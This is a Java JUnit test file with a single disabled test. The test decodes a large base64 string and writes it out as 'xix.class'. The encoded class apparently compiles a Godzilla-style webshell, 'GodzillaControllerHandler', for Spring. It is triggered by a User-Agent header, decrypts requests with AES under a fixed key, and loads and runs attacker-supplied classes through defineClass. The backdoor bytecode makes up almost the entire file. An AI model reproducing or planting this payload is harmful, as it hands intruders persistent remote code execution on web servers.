package com.reajason.javaweb.util;

import org.apache.commons.codec.binary.Base64;
import org.junit.jupiter.api.Disabled;
import org.junit.jupiter.api.Test;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;

/**
 * @author ReaJason
 * @since 2024/12/22
 */
class ClassUtilsTest {

    @Test
    @Disabled
    void testBase64() throws IOException {
        byte[] bytes = Base64.decodeBase64("yv66vgAAADQBMgoAUgCfCACgCQA7AKEIAKIJADsAowoAUgCkBwClCgAHAJ8JADsApgoABwCnCQA7AKgKAAcAqQoAOwCqCQA7AKsIAKwKAK0ArgoAJACvCgAkALAKAK0AsQcAsgoArQCzCgAUALQKABQAtQoAJAC2BwC3CAC4CgAhALkIALoKACEAuwoAvAC9CgAjAL4IAL8HAMAHAHUHAMEHAMIIAMMKACEAxAgAxQgAxggAxwgAyAgAyQoAUgDKCADLCgDMAM0HAM4KAC8AzwoAzADQCgDMANELANIA0woAJADUCwDSANULANIA1goAOwDXCgA7ANgIANkLANoA2wcA3AoAIQDdCgA7AKQKADsA3gsA2gDfCADgCwDSAN8HAOEKAEIAnwcA4gcA4wcA5AoARgDlCgAjAOYLAOcA6AoAJADpCgDqAOsKACMAqQoAQgDsCgA7AO0KACQA7ggAVggA7wcA8AcA8QEAA21kNQEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABHBhc3MBAANrZXkBAApoZWFkZXJOYW1lAQALaGVhZGVyVmFsdWUBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEALkxvcmcvZXhhbXBsZS9zcHJpbmcvR29kemlsbGFDb250cm9sbGVySGFuZGxlcjsBABooTGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEABnBhcmVudAEAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAFtAQAdTGphdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdDsBAAFzAQADcmV0AQANU3RhY2tNYXBUYWJsZQcAwgcAtwEADGJhc2U2NEVuY29kZQEAFihbQilMamF2YS9sYW5nL1N0cmluZzsBAAZiYXNlNjQBABFMamF2YS9sYW5nL0NsYXNzOwEAB0VuY29kZXIBABJMamF2YS9sYW5nL09iamVjdDsBAAR2YXI2AQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQACYnMBAAJbQgEABXZhbHVlAQAWTG9jYWxWYXJpYWJsZVR5cGVUYWJsZQEAFExqYXZhL2xhbmcvQ2xhc3M8Kj47AQAKRXhjZXB0aW9ucwEACWI2NERlY29kZQEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBAAdkZWNvZGVyAQABUQEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAAmNiAQABeAEAByhbQlopW0IBAAFjAQAVTGphdmF4L2NyeXB0by9DaXBoZXI7AQAEdmFyNAEAAVoHANwHAPIBAA1oYW5kbGVSZXF1ZXN0AQB/KExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTspTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvTW9kZWxBbmRWaWV3OwEAAWYBAAFlAQAoTGphdmEvbGFuZy9SZWZsZWN0aXZlT3BlcmF0aW9uRXhjZXB0aW9uOwEABmFyck91dAEAH0xqYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbTsBAAdzZXNzaW9uAQAgTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbjsBAARkYXRhAQAHcmVxdWVzdAEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEACHJlc3BvbnNlAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwcA8wcA9AcA9QcA4QcA9gcAwQEACDxjbGluaXQ+AQAKU291cmNlRmlsZQEAHkdvZHppbGxhQ29udHJvbGxlckhhbmRsZXIuamF2YQwAWgBbAQAKVXNlci1BZ2VudAwAWABVAQAaU3ByaW5nX0dvZHppbGxhX0NvbnRyb2xsZXIMAFkAVQwAWgBhAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMAFYAVQwA9wD4DABXAFUMAPkA+gwAVABkDABUAFUBAANNRDUHAPsMAPwA/QwA/gD/DAEAAQEMAQIBAwEAFGphdmEvbWF0aC9CaWdJbnRlZ2VyDAEEAP8MAFoBBQwA+QEGDAEHAPoBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAQamF2YS51dGlsLkJhc2U2NAwBCAEJAQAKZ2V0RW5jb2RlcgwBCgELBwEMDAENAQ4MAQ8BEAEADmVuY29kZVRvU3RyaW5nAQAPamF2YS9sYW5nL0NsYXNzAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBABZzdW4ubWlzYy5CQVNFNjRFbmNvZGVyDAERARIBAAZlbmNvZGUBAApnZXREZWNvZGVyAQAGZGVjb2RlAQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcgEADGRlY29kZUJ1ZmZlcgwBEwEUAQADQUVTBwDyDAD8ARUBAB9qYXZheC9jcnlwdG8vc3BlYy9TZWNyZXRLZXlTcGVjDABaARYMARcBGAwBGQEaBwD0DAEbAGQMARwBHQwBHgEfDAEgAGQMAHoAewwAgACBAQAHcGF5bG9hZAcA8wwBIQEiAQAsb3JnL2V4YW1wbGUvc3ByaW5nL0dvZHppbGxhQ29udHJvbGxlckhhbmRsZXIMASMBJAwAfQB+DAElASYBAApwYXJhbWV0ZXJzAQAdamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW0BACBqYXZhL2xhbmcvSWxsZWdhbEFjY2Vzc0V4Y2VwdGlvbgEAIGphdmEvbGFuZy9JbnN0YW50aWF0aW9uRXhjZXB0aW9uAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24MAFoBJwwBKAEpBwD1DAEqASsMASwBLQcBLgwBLwEwDAExAP8MAGwAbQwBLAEGAQAQM2M2ZTBiOGE5YzE1MjI0YQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEALm9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL0NvbnRyb2xsZXIBABNqYXZheC9jcnlwdG8vQ2lwaGVyAQAeamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAmamF2YS9sYW5nL1JlZmxlY3RpdmVPcGVyYXRpb25FeGNlcHRpb24BAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAbamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0AQALZ2V0SW5zdGFuY2UBADEoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3NlY3VyaXR5L01lc3NhZ2VEaWdlc3Q7AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAGbGVuZ3RoAQADKClJAQAGdXBkYXRlAQAHKFtCSUkpVgEABmRpZ2VzdAEABihJW0IpVgEAFShJKUxqYXZhL2xhbmcvU3RyaW5nOwEAC3RvVXBwZXJDYXNlAQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwEAC2RlZmluZUNsYXNzAQAXKFtCSUkpTGphdmEvbGFuZy9DbGFzczsBACkoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEAFyhbQkxqYXZhL2xhbmcvU3RyaW5nOylWAQAEaW5pdAEAFyhJTGphdmEvc2VjdXJpdHkvS2V5OylWAQAHZG9GaW5hbAEABihbQilbQgEACWdldEhlYWRlcgEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQAKZ2V0U2Vzc2lvbgEAIigpTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbjsBAAxnZXRQYXJhbWV0ZXIBAAxnZXRBdHRyaWJ1dGUBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvT2JqZWN0OwEADmdldENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEADHNldEF0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");
        Files.write(Paths.get("xix.class"), bytes);
    }

}